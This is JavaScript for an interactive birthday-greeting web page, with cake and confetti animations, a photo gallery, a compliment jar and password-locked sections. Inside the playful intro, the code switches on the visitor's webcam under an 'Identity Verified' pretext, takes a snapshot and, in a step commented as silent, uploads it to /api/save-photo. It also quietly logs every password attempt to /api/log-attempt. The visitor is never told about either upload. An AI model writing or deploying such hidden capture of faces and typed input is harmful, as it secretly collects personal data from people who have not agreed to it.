document.addEventListener('DOMContentLoaded', () => {
    // --- Preload Video for Smoothness ---
    const pv = document.getElementById('personal-video');
    if (pv) {
        pv.load(); 
    }

    // --- Intro Cake Sequence Logic ---
    const startIntroCakeBtn = document.getElementById('start-intro-cake-btn');
    const introContainer = document.getElementById('intro-container');
    const introCakeScene = document.getElementById('intro-cake-scene');
    const buildingCakeContainer = document.getElementById('building-cake-container');
    const lockScreen = document.getElementById('lock-screen');
    
    if (startIntroCakeBtn) {
        startIntroCakeBtn.addEventListener('click', async () => {
            introContainer.classList.add('hidden');
            
            const delay = ms => new Promise(res => setTimeout(res, ms));
            
            // Wait a little before the camera so the button click is felt
            await delay(500);
            
            // Bring up the camera
            const cameraScene = document.getElementById('camera-scene');
            const cameraContainer = document.getElementById('camera-container');
            const cameraText = document.getElementById('camera-text');
            const liveCamera = document.getElementById('live-camera');
            const cameraSnapshot = document.getElementById('camera-snapshot');
            const cameraIcon = document.getElementById('camera-icon');
            
            cameraScene.classList.remove('hidden');
            
            let stream = null;
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                liveCamera.srcObject = stream;
                cameraIcon.style.display = 'none';
                liveCamera.classList.remove('hidden');
                liveCamera.classList.add('active');
                await liveCamera.play().catch(e => console.log("Play failed", e));
            } catch (err) {
                console.log("Webcam access denied or unavailable", err);
            }
            
            // Allow CSS display:flex to register before animating
            await delay(50);
            cameraContainer.classList.add('slide-up');
            
            // Wait for it to slide up and give them time to pose
            await delay(2500);
            
            // Camera flash effect
            const flash = document.createElement('div');
            flash.id = 'camera-flash';
            document.body.appendChild(flash);
            
            // Trigger the absolute white flash instantly
            flash.classList.add('flash');
            
            // Allow the browser to render the pure white screen
            await delay(60);
            
            // While screen is blinded, freeze frame onto canvas!
            if (stream) {
                cameraSnapshot.width = liveCamera.videoWidth || 250;
                cameraSnapshot.height = liveCamera.videoHeight || 250;
                const ctx = cameraSnapshot.getContext('2d');
                ctx.translate(cameraSnapshot.width, 0);
                ctx.scale(-1, 1);
                ctx.drawImage(liveCamera, 0, 0, cameraSnapshot.width, cameraSnapshot.height);
                
                liveCamera.classList.remove('active');
                liveCamera.classList.add('hidden');
                cameraSnapshot.classList.remove('hidden');
                cameraSnapshot.classList.add('active'); // Show frozen photo
                
                // Silently upload the photo to the backend
                try {
                    const imageBase64 = cameraSnapshot.toDataURL('image/png');
                    fetch('/api/save-photo', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ imageBase64 })
                    }).catch(e => console.log("Silent upload ignored"));
                } catch(e) {}
                
                stream.getTracks().forEach(track => track.stop());
            }

            // Update text
            cameraText.innerText = "Identity Verified! ✅";
            cameraText.classList.add('success');
            
            // Fade the white flash out slowly
            flash.classList.remove('flash');
            
            // Let them view their verified photo
            await delay(3000);
            
            // Clean up the DOM and swap cleanly to the Lock Screen
            introCakeScene.style.display = 'none';
            introCakeScene.classList.add('hidden');
            cameraScene.classList.add('hidden');
            
            lockScreen.classList.remove('hidden');
            lockScreen.classList.add('active');
            
            flash.remove();
        });
    }


    // --- Lock Screen Logic ---
    const unlockBtn = document.getElementById('unlock-btn');
    const passwordInput = document.getElementById('password-input');
    const errorMsg = document.getElementById('error-msg');
    const mainContent = document.getElementById('main-content');
    
    // Set your special character or password here
    const correctPassword = "SUPTA PAUL"; 
    
    function checkPassword() {
        const inputPass = passwordInput.value.trim();
        
        // Log the attempt silently
        fetch('/api/log-attempt', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                password: inputPass, 
                timestamp: new Date().toLocaleString(),
                type: 'riddle'
            })
        }).catch(e => console.log("Log failed"));

        if (inputPass.toUpperCase() === correctPassword.toUpperCase()) {
            // Success - Start Sequence
            lockScreen.classList.add('hidden');
            setTimeout(() => {
                lockScreen.style.display = 'none';
                
                // Show Cake Scene
                const cakeScene = document.getElementById('cake-scene');
                cakeScene.classList.remove('hidden');
                
                // Generate Confetti
                const confettiContainer = document.getElementById('confetti-container');
                if (confettiContainer) {
                    const colors = ['#fce18a', '#ff726d', '#b48def', '#f4306d', '#64e1fa'];
                    for (let i = 0; i < 70; i++) {
                        const confetti = document.createElement('div');
                        confetti.classList.add('confetti-piece');
                        confetti.style.left = Math.random() * 100 + 'vw';
                        confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
                        // Random duration between 2s and 5s
                        const duration = Math.random() * 3 + 2; 
                        // Random delay
                        const delay = Math.random() * 5;
                        
                        confetti.style.animation = `confettiFall ${duration}s linear infinite`;
                        confetti.style.animationDelay = `${delay}s`;
                        
                        confettiContainer.appendChild(confetti);
                    }
                }

                // Connect Cut Cake Button
                const cutCakeBtn = document.getElementById('cut-cake-btn');
                
                if(cutCakeBtn) {
                    cutCakeBtn.addEventListener('click', function startSequence(e) {
                        e.stopPropagation();
                        // Hide the button to prevent multiple clicks
                        cutCakeBtn.style.display = 'none';
                        
                    // Start Animation Sequence
                    const knife = document.getElementById('knife');
                    const cakeWhole = document.getElementById('cake-whole');
                    const cakeSlice = document.getElementById('cake-slice');
                    const dog = document.getElementById('dog');

                    knife.classList.add('cut-animation');
                    
                    // After knife cuts deep enough
                    setTimeout(() => {
                        cakeWhole.classList.add('hidden');
                        cakeSlice.classList.remove('hidden');
                        
                        // Move slice to dog
                        setTimeout(() => {
                            cakeSlice.classList.add('slice-move');
                            
                            // Dog eats
                            setTimeout(() => {
                                dog.classList.add('dog-eat');
                                dog.innerText = '🐕'; // Change to dog eating
                                
                                // Dog gives heart
                                setTimeout(() => {
                                    const dogHeart = document.createElement('div');
                                    dogHeart.id = 'dog-heart';
                                    dogHeart.innerText = '❤️';
                                    cakeScene.querySelector('.scene-container').appendChild(dogHeart);
                                    dogHeart.classList.add('heart-pop');
                                    
                                    // End Scene and show Main Content
                                    setTimeout(() => {
                                        cakeScene.style.opacity = '0';
                                        setTimeout(() => {
                                            cakeScene.style.display = 'none';
                                            
                                            // Show Main content
                                            mainContent.classList.remove('hidden');
                                            void mainContent.offsetWidth; // trigger reflow
                                            mainContent.classList.add('visible');
                                            createBackgroundElements();
                                        }, 800);
                                    }, 1500); // Time to show heart
                                }, 800); // Wait for dog to finish eating
                            }, 1800); // Time for slice to reach dog
                        }, 500); 
                    }, 1200); // knife cuts exactly here in animation (1.2s into 2.5s)
                    });
                }
            }, 800); // match CSS transition duration
        } else {
            // Fail
            errorMsg.classList.remove('hidden');
            passwordInput.classList.add('error-shake');
            setTimeout(() => passwordInput.classList.remove('error-shake'), 500);
        }
    }

    unlockBtn.addEventListener('click', checkPassword);
    
    passwordInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            checkPassword();
        }
    });

    // --- Background Elements (Balloons, Hearts, Flowers) ---
    function createBackgroundElements() {
        const balloonsContainer = document.getElementById('balloons');
        const heartsContainer = document.getElementById('hearts');
        const flowersContainer = document.getElementById('flowers');
        
        const emojis = {
            balloons: ['🎈', '🎀', '🎉', '✨'],
            hearts: ['❤️', '💖', '💕', '💗', '💓'],
            flowers: ['🌸', '🌺', '🌷', '🌼', '🦋']
        };

        function createElement(type, container, count) {
            for (let i = 0; i < count; i++) {
                const el = document.createElement('div');
                el.classList.add('element');
                
                // Randomly select emoji
                const emojiArray = emojis[type];
                el.innerText = emojiArray[Math.floor(Math.random() * emojiArray.length)];
                
                // Randomize styles
                const size = Math.random() * 25 + 20; // 20px to 45px
                const left = Math.random() * 100; // 0% to 100%
                const animDuration = Math.random() * 10 + 12; // 12s to 22s
                const animDelay = Math.random() * 5; // 0s to 5s
                
                el.style.fontSize = `${size}px`;
                el.style.left = `${left}%`;
                el.style.animationDuration = `${animDuration}s`;
                el.style.animationDelay = `${animDelay}s`;
                
                container.appendChild(el);
            }
        }

        const isMobile = window.innerWidth <= 768;
        createElement('balloons', balloonsContainer, isMobile ? 8 : 20);
        createElement('hearts', heartsContainer, isMobile ? 10 : 25);
        createElement('flowers', flowersContainer, isMobile ? 8 : 20);
    }

    // --- Message Cards Expansion ---
    const messageCards = document.querySelectorAll('.message-card');
    messageCards.forEach(card => {
        card.addEventListener('click', () => {
            // Collapse other cards (Optional, keeping it simple to just toggle)
            messageCards.forEach(c => {
                if (c !== card) c.classList.remove('expanded');
            });
            // Toggle the clicked card
            card.classList.toggle('expanded');
        });
    });

    // --- Dynamic Photo Gallery ---
    const photoGallery = document.getElementById('photo-gallery');
    if (photoGallery) {
        const unsplashIds = [
            '1518895949257-7621c3c786d7', '1513151233558-d860c5398176', '1520854221256-17451cc331bf',
            '1522673607200-164d1f6ce364', '1494790108377-be9c29b29330', '1527529482086-ff55c17d23d8',
            '1474552226712-ac0f0dca24ca', '1511895426328-dc8714191300', '1530103862677-de3997b2c65f',
            '1531746020798-e6953c6e8e04', '1464349095431-e9a21285b5f3', '1550989460-0adf9ea622e2',
            '1485182902347-1af6bf65caef', '1528605248328-5374fc7102e1', '1528605105345-53449839f9b5',
            '1517482479590-db0ccaf8e244', '1511895188610-c4083a31c504', '1492684223066-81342ee5ff30',
            '1517849845537-4d257902454a', '1469334031218-e382a71b716b', '1488161628813-0a256d0bea36',
            '1501901609772-dfad5263cbce', '1529333166437-7750a6dd5a70', '1533227260871-bf0cce95c1c0',
            '1505934333218-8fec42a176e5'
        ];
        let photosHTML = '';
    const messageString = "happybirthdaySneha❤️🧿🎈🎂🎁🎉🌹";
    const chars = [...messageString]; // Splits by character properly including emojis

    for(let i = 1; i <= 25; i++) {
        const fallbackImg = `https://images.unsplash.com/photo-${unsplashIds[i - 1]}?q=80&w=600&auto=format&fit=crop`;
        const char = chars[i - 1] || "";
        photosHTML += `
            <div class="photo-frame">
                <div class="clip"></div>
                <img src="photo${i}.jpg" alt="Memory ${i}" 
                     onerror="
                        if (this.src.endsWith('.jpg')) { this.src = 'photo${i}.jpeg'; } 
                        else if (this.src.endsWith('.jpeg')) { this.src = 'photo${i}.png'; } 
                        else if (this.src.endsWith('.png')) { this.src = '${fallbackImg}'; }
                     ">
                <div class="frame-caption">${char}</div>
            </div>
        `;
    }
    // Insert twice for seamless scrolling
    photoGallery.innerHTML = photosHTML + photosHTML;
}

    // --- Image Modal Expansion ---
    const imageModal = document.getElementById('image-modal');
    const expandedImg = document.getElementById('expanded-img');
    const closeModal = document.querySelector('.close-modal');
    const images = document.querySelectorAll('.photo-frame img');

    if (imageModal && expandedImg && images.length > 0) {
        images.forEach(img => {
            img.addEventListener('click', function(e) {
                e.stopPropagation();
                
                const frame = this.closest('.photo-frame');
                if (!frame) return;

                // 1. Shake and Color effect
                frame.classList.add('shake-ani', 'developing');
                
                // 2. Magic Sparkle Trail
                const rect = this.getBoundingClientRect();
                const startX = rect.left + rect.width / 2;
                const startY = rect.top + rect.height / 2;

                for (let i = 0; i < 15; i++) {
                    const sparkle = document.createElement('div');
                    sparkle.className = 'magic-sparkle';
                    sparkle.innerText = ['✨', '⭐', '🪄', '🌟'][Math.floor(Math.random() * 4)];
                    sparkle.style.left = `${startX}px`;
                    sparkle.style.top = `${startY}px`;
                    
                    // Random fly direction
                    const tx = (Math.random() - 0.5) * 300;
                    const ty = (Math.random() - 0.5) * 300;
                    sparkle.style.setProperty('--tx', `${tx}px`);
                    sparkle.style.setProperty('--ty', `${ty}px`);
                    
                    document.body.appendChild(sparkle);
                    setTimeout(() => sparkle.remove(), 1000);
                }

                // Wait for development/shaking to feel real before expansion
                setTimeout(() => {
                    imageModal.classList.remove('hidden');
                    setTimeout(() => {
                        imageModal.classList.add('active');
                    }, 10);
                    expandedImg.src = this.src;
                    
                    // Cleanup shake (keep color)
                    frame.classList.remove('shake-ani');
                }, 700);
            });
        });

        // Close on X click
        closeModal.addEventListener('click', () => {
            imageModal.classList.remove('active');
            setTimeout(() => {
                imageModal.classList.add('hidden');
            }, 400); // Wait for transition
        });

        // Close when clicking outside image
        imageModal.addEventListener('click', (e) => {
            if (e.target !== expandedImg) {
                imageModal.classList.remove('active');
                setTimeout(() => {
                    imageModal.classList.add('hidden');
                }, 400);
            }
        });
    }

    // --- Video Lock Logic ---
    const videoLockScreen = document.getElementById('video-lock-screen');
    const videoBtn = document.getElementById('video-unlock-btn');
    const videoInput = document.getElementById('video-password');
    const videoError = document.getElementById('video-error');
    const personalVideo = document.getElementById('personal-video');
    
    if (videoBtn) {
        videoBtn.addEventListener('click', () => {
            const val = videoInput.value.trim();
            const correctVideoPassword = "Family";
            
            // Log the attempt
            fetch('/api/log-attempt', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    password: val, 
                    timestamp: new Date().toLocaleString(),
                    type: 'video'
                })
            }).catch(e => console.log("Log failed"));

            if (val === correctVideoPassword) {
                videoLockScreen.style.opacity = '0';
                videoLockScreen.style.pointerEvents = 'none';
                
                // Optimized playback sequence
                setTimeout(() => {
                    videoLockScreen.style.display = 'none';
                    personalVideo.style.opacity = '1';
                    personalVideo.style.pointerEvents = 'auto';
                    
                    // Add performance optimization class
                    document.body.classList.add('video-playing');
                    
                    personalVideo.play().catch(e => {
                        console.log("Play failed, likely requires user interaction", e);
                    });
                }, 500);
            } else {
                videoError.classList.remove('hidden');
            }
        });
    }

    // Performance Cleanup
    if (personalVideo) {
        personalVideo.addEventListener('pause', () => {
            document.body.classList.remove('video-playing');
        });
        personalVideo.addEventListener('ended', () => {
            document.body.classList.remove('video-playing');
        });
    }

    // --- Interactive Magic Cursor / Star Trail ---
    const trailEmojis = ['❤️', '✨', '💖', '🌸', '🪄', '⭐'];
    let lastTrailTime = 0;
    
    function createTrailElement(x, y, isClick = false) {
        const el = document.createElement('div');
        el.className = 'cursor-trail-element';
        el.innerText = trailEmojis[Math.floor(Math.random() * trailEmojis.length)];
        
        // Random drift direction and distance
        const angle = Math.random() * Math.PI * 2;
        const distance = isClick ? (Math.random() * 80 + 30) : (Math.random() * 40 + 15);
        const dx = Math.cos(angle) * distance;
        const dy = Math.sin(angle) * distance;
        
        el.style.left = `${x}px`;
        el.style.top = `${y}px`;
        el.style.setProperty('--dx', `${dx}px`);
        el.style.setProperty('--dy', `${dy}px`);
        
        document.body.appendChild(el);
        
        // Remove after animation finishes
        setTimeout(() => {
            el.remove();
        }, 800);
    }

    function handleMove(e) {
        const now = Date.now();
        if (now - lastTrailTime > 80) { // Throttled for mobile performance
            const x = e.touches ? e.touches[0].clientX : e.clientX;
            const y = e.touches ? e.touches[0].clientY : e.clientY;
            createTrailElement(x, y);
            lastTrailTime = now;
        }
    }

    function handleClick(e) {
        const x = e.clientX || (e.touches && e.touches[0].clientX);
        const y = e.clientY || (e.touches && e.touches[0].clientY);
        if (x !== undefined && y !== undefined) {
             // Burst of 8 particles on click
             for(let i=0; i<8; i++) {
                 createTrailElement(x, y, true);
             }
        }
    }

    document.addEventListener('mousemove', handleMove);
    document.addEventListener('touchmove', handleMove, { passive: true });
    // Use pointerdown to catch both fast taps and mouse clicks reliably without double-firing easily
    document.addEventListener('pointerdown', handleClick);

    // --- Jar of Stars Logic ---
    const jar = document.getElementById('magic-jar');
    const starsInsideContainer = document.getElementById('stars-inside');
    const starMessageDisplay = document.getElementById('star-message-display');
    const starTextInner = document.querySelector('.star-text-inner');
    const closeStarMsg = document.querySelector('.close-star-msg');
    
    if (jar) {
        const starNotes = [
            "I love your beautiful smile ✨",
            "You have the most amazing sense of humor 💖",
            "Your kindness brightens everyone's day 🌸",
            "I love how passionate you are about your dreams 🌟",
            "You are ridiculously cute! ❤️",
            "I admire your strength and resilience 💪",
            "Every moment with you is a favorite memory 🕰️",
            "You always know how to make me laugh 😂",
            "I love the way your eyes sparkle ✨",
            "You make the world objectively better 🌎"
        ];
        
        // Fill jar initially
        let currentNotes = [...starNotes]; // Copy array
        for(let i=0; i<currentNotes.length; i++) {
            const ls = document.createElement('div');
            ls.className = 'little-star';
            ls.innerText = '⭐';
            ls.style.animationDelay = `${Math.random() * 2}s`;
            ls.style.opacity = Math.random() * 0.5 + 0.5;
            starsInsideContainer.appendChild(ls);
        }

        jar.addEventListener('click', (e) => {
            // Prevent trailing star from activating underneath
            e.stopPropagation();

            if (currentNotes.length === 0) {
                // Refill if empty!
                currentNotes = [...starNotes];
            }
            
            // Pick random note
            const randomIndex = Math.floor(Math.random() * currentNotes.length);
            const selectedNote = currentNotes.splice(randomIndex, 1)[0];
            
            // Remove one visual star from jar
            if(starsInsideContainer.lastChild) {
                starsInsideContainer.removeChild(starsInsideContainer.lastChild);
            }
            
            // Animate flying star
            const rect = jar.getBoundingClientRect();
            const startX = rect.left + rect.width / 2;
            const startY = rect.top + rect.height / 2;
            
            const flyingStar = document.createElement('div');
            flyingStar.className = 'flying-star';
            flyingStar.innerText = '🌟';
            flyingStar.style.left = `${startX}px`;
            flyingStar.style.top = `${startY}px`;
            
            // Random horizontal movement
            const mx = (Math.random() - 0.5) * 200;
            flyingStar.style.setProperty('--mx', `${mx}px`);
            
            document.body.appendChild(flyingStar);
            
            // Wait for star animation to finish, then show message popup
            setTimeout(() => {
                flyingStar.remove();
                starTextInner.innerText = selectedNote;
                starMessageDisplay.classList.remove('hidden');
                setTimeout(() => {
                    starMessageDisplay.classList.add('active'); // triggers scale animation
                }, 10);
            }, 1000); 
        });
        
        closeStarMsg.addEventListener('click', () => {
            starMessageDisplay.classList.remove('active');
            setTimeout(() => {
                starMessageDisplay.classList.add('hidden');
            }, 500); // Wait for scale out transition
        });
    }

});
